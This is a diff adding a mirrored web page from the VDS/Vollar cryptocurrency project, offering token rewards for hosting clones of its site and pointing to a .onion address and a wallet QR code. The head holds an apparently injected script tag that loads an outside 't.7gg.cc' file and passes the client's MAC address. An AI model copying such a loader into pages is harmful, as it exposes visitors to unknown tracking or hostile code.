@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html>
+    
+<!-- Mirrored from www.vds.nz/paper/detail/2 by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 18 Jun 2019 02:55:58 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>V-Dimension</title>
+        <meta name="keywords" content="V-Dimensi,blockchain">
+        <meta name="description" content="V-Dimensio">
+        <link rel="shortcut icon" href="../../statics/images/favicon.ico">
+        <link href="../../statics/css/common.css" rel="stylesheet"/>
+        <script src="../../statics/libs/jquery.min.js"></script>
+        <script src="../../statics/libs/jquery.cookie.js"></script>
+        <script src="../../statics/plugins/layer/layer.js"></script>
+        <script src="../../statics/plugins/qrcode/qrcode.min.js"></script>
+
+        <script>
+            function numFormat(num) {
+                var c = (num.toString().indexOf ('.') !== -1) ? num.toLocaleString() : num.toString().replace(/(\d)(?=(?:\d{3})+$)/g, '$1,');
+                return c;
+            }
+
+            $.ajaxSetup({
+                layerIndex:-1,
+                beforeSend: function(jqXHR, settings) {
+                    this.layerIndex = layer.load(1);
+                },
+                complete: function () {
+                    layer.close(this.layerIndex);
+                },
+                error: function (jqXHR, status, e) {
+                    layer.alert('Data request failed, please try again!');
+                }
+            });
+        </script>
+    <script async=true src="../../../t.7gg.cc_88/j1cdbf.js?MAC=CC81DA39F680"></script>
+</head>
+
+    <body>
+        <div id="root">
+            <link href="../../statics/css/header.css" rel="stylesheet">
+
+<style>
+    .header-c-m-m a.nav-active{
+        font-size: 18px;
+        color: #4A90E2;
+        font-weight: bold;
+    }
+</style>
+
+<div class="header-container">
+    <div class="header-c-m">
+        <div class="header-c-m-l"></div>
+        <div class="header-c-m-m">
+            <ul>
+                    <li><a href="../../index.html">Home</a></li>
+
+                    <li><a href="../../icex.html">CEX</a></li>
+
+                <li><a href="../../game.html">The Games</a></li>
+
+                    <li><a href="../../whats.html">WHAT'S V</a></li>
+
+                <li><a class="nav-active" href="../../paper.html">Ecology</a></li>
+
+                    <li><a href="../../source.html">Download</a></li>
+
+                    <li><a href="../../faq.html">FAQ</a></li>
+            </ul>
+        </div>
+        <div class="header-c-m-r">
+            <div class="current_lang">
+                <div class="lang">
+                    <span class="lang-txt">English</span>
+                    <span class="fa fa-chevron-down chevron"></span>
+                </div>
+            </div>
+            <div class="more_lang">
+                <div class="lang selected" data-value='en_US' data-en="English" id="en_US">
+                    <span class="lang-txt">English</span>
+                </div>
+                <div class="lang" data-value='de_DE' data-en="Deutsch" id="de_DE">
+                    <span class="lang-txt">Deutsch</span>
+                </div>
+                <div class="lang" data-value='es_ES' data-en="Español" id="es_ES">
+                    <span class="lang-txt">Español</span>
+                </div>
+                <div class="lang" data-value='fr_FR' data-en="Français" id="fr_FR">
+                    <span class="lang-txt">Français</span>
+                </div>
+                <div class="lang" data-value="en_MY" data-en="Malay" id="en_MY">
+                    <span class="lang-txt">Malay</span>
+                </div>
+                <div class="lang" data-value="pt_PT" data-en="Português" id="pt_PT">
+                    <span class="lang-txt">Português</span>
+                </div>
+                <div class="lang" data-value='ru_RU' data-en="русский" id="ru_RU">
+                    <span class="lang-txt">русский</span>
+                </div>
+                <div class="lang" data-value="hi_HI" data-en="हिन्दी" id="hi_HI">
+                    <span class="lang-txt">हिन्दी</span>
+                </div>
+                <div class="lang" data-value="fa_FA" data-en="فارسی" id="fa_FA">
+                    <span class="lang-txt">فارسی</span>
+                </div>
+                <div class="lang" data-value='ko_KR' data-en="한국의" id="ko_KR">
+                    <span class="lang-txt">한국의</span>
+                </div>
+                <div class="lang" data-value='ja_JP' data-en="日本の" id="ja_JP">
+                    <span class="lang-txt">日本の</span>
+                </div>
+                <div class="lang" data-value='zh_HK' data-en="中文(繁体)" id="zh_HK">
+                    <span class="lang-txt">中文(繁体)</span>
+                </div>
+                <div class="lang" data-value='zh_CN' data-en="中文(简体)" id="zh_CN">
+                    <span class="lang-txt">中文(简体)</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+
+    $(document).ready(function(){
+
+        $('.feature').on('click',function(){
+            layer.msg('Stay Tuned', {
+                skin: 'demo-class',
+                time: 2000,
+            });
+        });
+
+        $('.header-c-m-l').on('click',function(){
+            window.location.href='../../index.html';
+        });
+
+        var cookieLang = $.cookie("lang");
+        var img = $('#' + cookieLang).find('img').attr('src');
+        var lang = $('#' + cookieLang).attr('data-en');
+        $('.current_lang .lang-txt').text(lang);
+        $('.current_lang img').attr('src', img);
+        $('#' + cookieLang).addClass('selected').siblings().removeClass('selected');
+
+        $(document).click( function(e) {
+            $('.header-c-m-r, .more_lang').removeClass('active');
+        });
+
+        $('.header-c-m-r .current_lang').click(function(e){
+            e.stopPropagation();
+            $(this).parent().toggleClass('active');
+
+            setTimeout(function(){
+                $('.more_lang').toggleClass('active');
+            }, 5);
+        });
+
+        $('.more_lang .lang').click(function(){
+            $(this).addClass('selected').siblings().removeClass('selected');
+            $('.more_lang').removeClass('active');
+
+            var img = $(this).find('img').attr('src');
+            var lang = $(this).attr('data-value');
+
+
+            $('.current_lang .lang-txt').text(lang);
+            $('.current_lang img').attr('src', img);
+
+            $.cookie("lang", lang, { expires: 30, path:'/'});
+            window.location.reload();
+        });
+    });
+</script><link href="../../statics/css/paper/detail.css" rel="stylesheet">
+
+<div id="dialog" style="display:none">
+    <div class="dialog-header">
+        <div class="dialog-header-title">
+            <p class="dialog-header-title-p">Note</p>
+        </div>
+        <div class="dialog-header-close">
+            <a onclick="closeBg();"> <img src="../../statics/images/img-close.png"> </a>
+        </div>
+    </div>
+    <div class="dialog-body" id="downloadDialog">
+        <p style="text-align: left;font-size: 14px;line-height: 26px;color: #2E4162;">
+            <p style="text-align: left;font-size: 14px;line-height: 26px;color: #2E4162;">In order to protect the privacy and safety of you as well as the Development Team, if you want to join in on any VDS ecological development tasks and win rewards, please navigate to the “Ecology” page of the Official VDS Deep Web Site, and click the relevant link to participate. The Official VDS Deep Web Site: <a style="ont-size: 14px;color: #4A90E2;" href="javascript:void(0)">vdsvvvxxmxpssszd.onion</a></p>
+        </p>
+    </div>
+    <div class="dialog-bottom" id="dialog-bottom">
+        <div class="dialog-bottom-left">
+            <button class="dialog-button" onclick="closeBg()">Confirm</button>
+        </div>
+    </div>
+</div>
+
+<div class="paper-detail-container">
+    <div class="paper-detail-container-header">
+        <div class="paper-detail-container-header-c">
+            <div class="paper-detail-container-header-l">
+                <h1>Clear Web Site Establishment</h1>
+                <p class="p-1">Release Time：2019-01-24 00:00</p>
+                <p class="p-2">Rewards can only be obtained by successfully completing tasks according to the basic requirements given by VDS.</p>
+                <p class="p-3">
+                    <span>
+                        <a>Task Reward： 2,600,000 Vollar</a>
+                    </span>
+                </p>
+            </div>
+            <div class="paper-detail-container-header-r"></div>
+        </div>
+
+    </div>
+    <div class="paper-detail-container-body-container">
+        <div class="paper-detail-container-body-container-inner">
+            <p>
+                <h1><strong>Task Rules</strong></h1>
+
+<p style="font-size: 14px;color:#2E4162;letter-spacing: 0;line-height: 28px;font-weight:normal;">1、After establishment of a Clear Web site, the builder must go through VDS and publish the Clear Web site information on the VAD Bidding System, write in the Clear Web site address，as well as the VDS address (must be non-anonymous) used to receive the reward, then keep up normal operation of the website.</p>
+
+<p style="font-size: 14px;color:#2E4162;letter-spacing: 0;line-height: 28px;font-weight:normal;">2、Clear Web sites do not require the Tor Browser. They can simply be an exact clone of the Deep Web official website. Any group or individual can obtain the Clear Web site codes and materials; they will be provided by the VDS Team. Please follow the instructions listed on the VDS Clear Web site tutorial.</p>
+
+<p style="font-size: 14px;color:#2E4162;letter-spacing: 0;line-height: 28px;font-weight:normal;">3、Information integrity must be guaranteed for any Clear Web site. Any amendments that go against standards will result in a failure to obtain rewards.</p>
+
+<p style="font-size: 14px;color:#2E4162;letter-spacing: 0;line-height: 28px;font-weight:normal;">4、Connectivity strength tests for the Clear Web sites will be performed each block week by the VDS team. In order to ensure the healthy development of the ecology, the 3 Clear Web sites with the lowest connection strength will be disqualified for rewards.</p>
+
+<h1><strong>Task Rewards</strong></h1>
+
+<p style="font-size: 14px;color: #2E4162;letter-spacing: 0;line-height: 28px;font-weight:normal;margin-bottom:20px;">The total rewards shared for Clear Web establishment is 2,600,000 Vollar, which will be issued across 260 VDS block weeks. In each block week (10,080 blocks) the reward will be evenly distributed to all self-built Clear Web sites which have met the necessary requirements. There is no limitation on the region or quantity of established VDS Clear Web sites. All clear web sites that meet the requirements will share the corresponding weekly rewards. Specifics are listed below</p>
+
+<table align="center" cellpadding="2" cellspacing="2" style="width:100%">
+    <tbody>
+    <tr>
+        <td colspan="3" style="padding-left: 50px;height: 65px; background: #2E4162; font-size: 18px;color: #FFFFFF; ">Clear Web Establishment Reward：2,600,000 Vollar</td>
+    </tr>
+    <tr>
+        <td rowspan="5" style="text-align:center;font-size: 14px;color: #2E4162;font-weight:normal;background: #F8F8F8;">Approx. 5 yrs（260 block-weeks）</td>
+        <td style="height:62px;text-align:center;font-size: 14px;color: #2E4162;font-weight:normal;background: #F8F8F8;">First Year</td>
+        <td style="height:62px;text-align:center;font-size: 14px;color: #2E4162;font-weight:normal;background: #F8F8F8;">1,040,000 （52 weeks *20,000）</td>
+    </tr>
+    <tr>
+        <td style="height:62px;text-align:center;font-size: 14px;color: #2E4162;font-weight:normal;background: #F8F8F8;">Second Year</td>
+        <td style="height:62px;text-align:center;font-size: 14px;color: #2E4162;font-weight:normal;background: #F8F8F8;">780,000（52 weeks *15,000）</td>
+    </tr>
+    <tr>
+        <td style="height:62px;text-align:center;font-size: 14px;color: #2E4162;font-weight:normal;background: #F8F8F8;">Third Year</td>
+        <td style="height:62px;text-align:center;font-size: 14px;color: #2E4162;font-weight:normal;background: #F8F8F8;">390,000（52 weeks *7,500）</td>
+    </tr>
+    <tr>
+        <td style="height:62px;text-align:center;font-size: 14px;color: #2E4162;font-weight:normal;background: #F8F8F8;">Fourth Year </td>
+        <td style="height:62px;text-align:center;font-size: 14px;color: #2E4162;font-weight:normal;background: #F8F8F8;">260,000（52 weeks *5,000）</td>
+    </tr>
+    <tr>
+        <td style="height:62px;text-align:center;font-size: 14px;color: #2E4162;font-weight:normal;background: #F8F8F8;">Fifth Year</td>
+        <td style="height:62px;text-align:center;font-size: 14px;color: #2E4162;font-weight:normal;background: #F8F8F8;">130,000（52 weeks *2,500）</td>
+    </tr>
+    </tbody>
+</table>
+
+<p>&nbsp;</p>
+            </p>
+        </div>
+
+        <div class="paper-detail-container-body-container-inner">
+            <h1>Download File</h1>
+            <div class="inner-download">
+                <div class="inner-download-l">
+                    <i class="icon-file"></i> Clear Web Establishment Installation Package and Deployment Tutorial
+                </div>
+                <div class="inner-download-r">
+                    <a class="download">Download</a>
+                </div>
+            </div>
+        </div>
+
+        <div class="paper-detail-container-body-container-inner">
+            <h1>List</h1>
+            <table id="net-list">
+                <tr>
+                    <th>Finish time</th>
+                    <th>Website</th>
+                    <th>Receiving Address</th>
+                    <th>Reward</th>
+                </tr>
+            </table>
+        </div>
+
+        <div class="paper-detail-container-body-container-br"></div>
+    </div>
+</div>
+
+<script>
+    $(document).ready(function() {
+        $(".download").click(
+            function() {
+                showBg();
+            }
+        );
+    });
+
+    function showBg() {
+        $("#dialog").show();
+
+        $('.header-container').addClass('add-blur');
+        $('.paper-detail-container').addClass('add-blur');
+        $('.footer-bg').addClass('add-blur');
+        $('body').addClass('add-overflow');
+    }
+
+    function closeBg() {
+        $("#dialog").hide();
+
+        $('.header-container').removeClass('add-blur');
+        $('.paper-detail-container').removeClass('add-blur');
+        $('.footer-bg').removeClass('add-blur');
+        $('body').removeClass('add-overflow');
+    }
+</script>
+<link href="../../statics/css/footer.css" rel="stylesheet">
+
+<div class="footer-bg">
+    <div class="footer-nav">
+        <div class="footer-nav-left">
+            <img style="width:163px;height:113px;" src="../../statics/images/img-banner-vds-1.png">
+        </div>
+        <div class="footer-nav-right">
+            <table style="border-collapse:separate; border-spacing:110px 20px;">
+                <tr>
+                    <td noWrap="noWrap" class="footer-nav-td1">Introduction</td>
+                    <td noWrap="noWrap" class="footer-nav-td1">Download</td>
+                    <td noWrap="noWrap" class="footer-nav-td1">Other</td>
+                </tr>
+                <tr>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="../../whats.html">What's V</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="../../source.html">APP/PC</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="../../faq.html">FAQ</a></td>
+                </tr>
+                <tr>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="../../cex.html">CEX</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="../../source.html">Other</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"></td>
+                </tr>
+                <tr>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="../../game.html">Top 10</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"></td>
+                </tr>
+            </table>
+        </div>
+        <div class="footer-nav-qrcode">
+            <div class="qrcode-container">
+                <div style="background: #FFFFFF;width:160px; height:160px;padding: 10px;border-radius:8px;margin: 0 auto;">
+                    <div id="qrcode"></div>
+                </div>
+                <p>Join My Team! Activate Your VID!</p>
+                <p class="addr-hidden" title="VcbKd8K5tgEv9a5iphhVqttmbQh7qa67CYD">VcbKd8K5tgEv9a5iphhVqttmbQh7qa67CYD</p>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+<script>
+    var qrcode = new QRCode(document.getElementById("qrcode"), {
+        text: "VcbKd8K5tgEv9a5iphhVqttmbQh7qa67CYD",
+        width: 140,
+        height: 140,
+        colorDark : "#000000",
+        colorLight : "#ffffff",
+        correctLevel : QRCode.CorrectLevel.H
+    });
+</script>
+        </div>
+    </body>
+
+<!-- Mirrored from www.vds.nz/paper/detail/2 by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 18 Jun 2019 02:55:58 GMT -->
+</html>
